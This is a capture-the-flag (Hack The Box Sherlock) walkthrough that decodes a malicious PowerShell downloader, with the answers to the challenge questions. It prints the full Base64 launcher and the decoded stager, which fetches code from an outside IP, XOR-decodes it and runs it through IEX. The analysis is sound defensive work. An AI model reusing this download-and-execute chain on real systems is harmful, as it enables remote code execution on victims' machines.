# PowerShell_Script

**Author:** Mehmet Sacit Çınar  
**Platform:** Hack The Box Sherlocks  
**Challenge:** PowerShell_Script  
**Focus:** PowerShell static analysis, Base64 decoding, XOR obfuscation  
**Tool:** CyberChef

## Overview

This challenge provides a suspicious PowerShell script containing a Base64-encoded command. The goal is to decode the command and identify how it communicates with a remote server and prepares downloaded code for execution.

The supplied scenario identifies the artifact as `C:\Users\LetsDefend\Desktop\ChallengeFile\script.ps1`. This walkthrough examines the command as text. The script was not executed, and the remote payload was not retrieved.

## 1. Inspecting the Command

The launcher begins with:

```powershell
powershell.exe -NoP -sta -NonI -W Hidden -Enc <Base64 data>
```

<details>
<summary>Base64</summary>

```text
JABXAEMAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwB5AFMAVABlAE0ALgBOAEUAVAAuAFcAZQBiAEMAbABpAEUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAEEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAG8AeABZACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFcARQBCAFIAZQBRAFUARQBzAHQAXQA6ADoARABFAEYAQQB1AEwAdABXAGUAYgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBPAHgAWQAuAEMAcgBFAGQAZQBuAFQAaQBhAGwAUwAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBFAHQALgBDAFIAZQBkAGUATgBUAEkAQQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4AZQB0AFcATwByAEsAQwByAGUAZABFAE4AVABpAEEAbABzADsAJABLAD0AJwBJAE0ALQBTACYAZgBBADkAWAB1AHsAWwApAHwAdwBkAFcASgBoAEMAKwAhAE4AfgB2AHEAXwAxADIATAB0AHkAJwA7ACQAaQA9ADAAOwBbAEMASABhAFIAWwBdAF0AJABCAD0AKABbAGMASABhAFIAWwBdAF0AKAAkAHcAYwAuAEQATwB3AE4ATABPAGEARABTAHQAcgBpAE4AZwAoACIAaAB0AHQAcAA6AC8ALwA5ADgALgAxADAAMwAuADEAMAAzAC4AMQA3ADAAOgA3ADQANAAzAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgAbwBSACQASwBbACQASQArACsAJQAkAGsALgBMAEUAbgBHAFQASABdAH0AOwBJAEUAWAAgACgAJABCAC0AagBPAEkAbgAnACcAKQA=
```

</details>

These arguments control how PowerShell starts:

| Argument | Full name | Purpose |
| --- | --- | --- |
| `-NoP` | `-NoProfile` | Skips loading PowerShell profile scripts. |
| `-sta` | `-STA` | Uses the Single-Threaded Apartment model. |
| `-NonI` | `-NonInteractive` | Disables interactive input; operations requiring user interaction fail. |
| `-W Hidden` | `-WindowStyle Hidden` | Hides the PowerShell window. |
| `-Enc` | `-EncodedCommand` | Accepts a Base64-encoded command represented as UTF-16LE text. |

The encoded argument conceals the command's readable form. Base64 is an encoding, not encryption.

### Task 0 — Script encoding

**Question:** What encoding is the malicious script using?

<details>
<summary>Reveal answer</summary>

**Answer:** `Base64`

</details>

### Task 1 — Hidden window

**Question:** What parameter in the powershell script makes it so that the powershell window is hidden when executed?

<details>
<summary>Reveal answer</summary>

**Answer:** `-W Hidden`

</details>

### Task 2 — Non-interactive execution

**Question:** What parameter in the PowerShell script prevents the user from closing the process?

<details>
<summary>Reveal answer</summary>

**Accepted answer:** `-NonI`

</details>

The question's wording is misleading. `-NonI` makes the session non-interactive; it does **not** prevent a user from terminating the process. Hiding the window and disabling interaction are separate behaviors.

## 2. Decoding with CyberChef

To recover the command:

1. Copy only the Base64 value after `-Enc` into CyberChef's **Input** panel.
2. Add **From Base64** to the recipe.
3. Add **Decode text** and select **UTF-16LE (1200)**.

The output reveals the PowerShell code below. Capitalization and spacing have been normalized for readability; the logic is unchanged.

```powershell
$WC = New-Object System.NET.WebClient
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$WC.Headers.Add('User-Agent', $u)

$WC.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

$K = 'IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty'
$i = 0

[char[]]$B = ([char[]](
    $WC.DownloadString("http://98.103.103.170:7443/index.asp")
)) | ForEach-Object {
    $_ -bxor $K[$i++ % $K.Length]
}

IEX ($B -join '')
```

## 3. Examining Network Access

### Task 3 — Creating the web client

**Question:** What line of code allows the script to interact with websites and retrieve information from them?

```powershell
$WC = New-Object System.Net.WebClient
```

This creates the .NET `WebClient` object. The script later uses its `DownloadString` method to retrieve remote content as text.

<details>
<summary>Reveal answer</summary>

**Answer:** `$WC=New-Object System.Net.WebClient`

</details>

### Task 4 — Spoofing the User-Agent

**Question:** What is the user agent string that is being spoofed in the malicious script?

```powershell
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$WC.Headers.Add('User-Agent', $u)
```

The script adds a browser-style User-Agent header resembling Internet Explorer 11 on 64-bit Windows 7. This describes the identity presented in the request; it does not establish the actual operating system of the affected host.

<details>
<summary>Reveal answer</summary>

**Answer:** `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko`

</details>

### Task 5 — Proxy authentication

**Question:** What line of code is used to set the proxy credentials for authentication in the script?

```powershell
$WC.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
```

The first statement selects the system's default web proxy. The second assigns the current security context's default network credentials for proxy authentication. It does not contain a hardcoded username or password.

<details>
<summary>Reveal answer</summary>

**Answer:** `$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials`

</details>

### Task 6 — Payload download URL

**Question:** When the malicious script is executed, what is the URL that the script contacts to download the malicious payload?

```powershell
$WC.DownloadString("http://98.103.103.170:7443/index.asp")
```

This statement requests the next stage from `98.103.103.170` on TCP port `7443`, using the path `/index.asp`. The scheme is plain **HTTP**, despite the port number.

<details>
<summary>Reveal answer</summary>

**Answer:** `http://98.103.103.170:7443/index.asp`

</details>

## 4. Unpacking and Executing the Next Stage

The remaining statements show what the script is designed to do with the downloaded text.

```powershell
$K = 'IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty'
$i = 0
```

`$K` holds the XOR key, and `$i` tracks the position in that key.

```powershell
$_ -bxor $K[$i++ % $K.Length]
```

Each downloaded character is XORed with the corresponding key character. The modulo operation wraps the index back to the start of the key, repeating it across the downloaded content. The resulting characters are stored in `$B`.

```powershell
IEX ($B -join '')
```

`-join ''` combines those characters into a string. `IEX`, an alias for `Invoke-Expression`, evaluates that string as PowerShell code. The shown command does not explicitly save the downloaded stage to a file before evaluating it.

Without the server response, the decoded next-stage content and its behavior cannot be determined from this launcher alone.

## 5. Findings and Indicators

The visible execution flow is:

1. Start PowerShell with a hidden window and a non-interactive session.
2. Decode the Base64 command supplied through `-EncodedCommand`.
3. Configure a WebClient with a browser-style User-Agent and default proxy credentials.
4. Download text from the remote HTTP endpoint.
5. Apply repeating-key XOR to the downloaded text.
6. Evaluate the reconstructed string with `Invoke-Expression`.

The following indicators were extracted from the supplied command. They describe the challenge artifact, not independently verified current threat infrastructure.

| Indicator | Value |
| --- | --- |
| Remote IPv4 address | `98.103.103[.]170` |
| TCP port | `7443` |
| Payload URL, defanged | `hxxp://98.103.103[.]170:7443/index.asp` |
| Request path | `/index.asp` |
| XOR key | `IM-S&fA9Xu{[)\|wdWJhC+!N~vq_12Lty` |

The command supports identifying this script as a downloader that decodes and executes a subsequent PowerShell stage. It does not establish what that stage ultimately does, whether the download succeeded, or whether execution occurred on a real host.
